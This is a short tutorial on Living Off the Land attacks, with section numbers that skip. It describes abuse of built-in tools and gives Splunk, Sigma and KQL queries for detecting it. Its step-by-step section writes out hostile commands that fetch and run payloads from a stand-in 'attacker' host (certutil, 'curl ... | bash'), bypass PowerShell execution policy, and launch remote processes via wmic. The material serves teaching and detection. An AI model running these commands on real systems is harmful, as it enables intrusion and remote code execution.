Living Off the Land Attack
- A technique where attackers use legitimate system tools and binaries to perform malicious actions while avoiding detection.

==================================================
1. Overview
==================================================
Living Off the Land (LotL) attacks use built-in tools already present on the system.

Instead of uploading malware, attackers use:

- PowerShell
- Windows binaries (LOLBins)
- Linux utilities

Advantages:

- no malware signatures
- reduced detection
- blends with normal activity

This technique is widely used in advanced attacks.


==================================================
2. Attack Scenario
==================================================
An attacker gains access to a Windows system.

Instead of deploying malware, the attacker uses PowerShell to download and execute scripts.

The activity appears legitimate because only trusted tools are used.

==================================================
5. Step-by-Step Execution
==================================================
Step 1 — Download Payload (Windows)

Example:

certutil -urlcache -split -f http://attacker/payload.exe payload.exe


Step 2 — Execute via PowerShell

Example:

powershell -ExecutionPolicy Bypass -File payload.ps1


Step 3 — Remote Execution

Example:

wmic /node:target process call create "cmd.exe"


Step 4 — Linux Equivalent

Example:

curl http://attacker/script.sh | bash

11. Blue Team Detection
==================================================
Indicators include:

- unusual use of system tools
- encoded PowerShell commands
- abnormal command-line arguments
- execution of rarely used binaries

Security teams should monitor:

- command-line activity
- script execution
- process behavior

14. SOC Detection Queries
==================================================

Splunk Query (Suspicious PowerShell)

index=windows
| search powershell AND "-enc"


Splunk Query (LOLBins Usage)

index=windows
| search certutil OR mshta OR wmic


Sigma Rule Example

title: Suspicious LOLBins Execution
logsource:
  product: windows
detection:
  selection:
    Image:
      - "*powershell.exe"
      - "*certutil.exe"
  condition: selection
level: medium


Microsoft Sentinel (KQL) Example

SecurityEvent
| where Process has_any ("powershell", "certutil", "wmic")
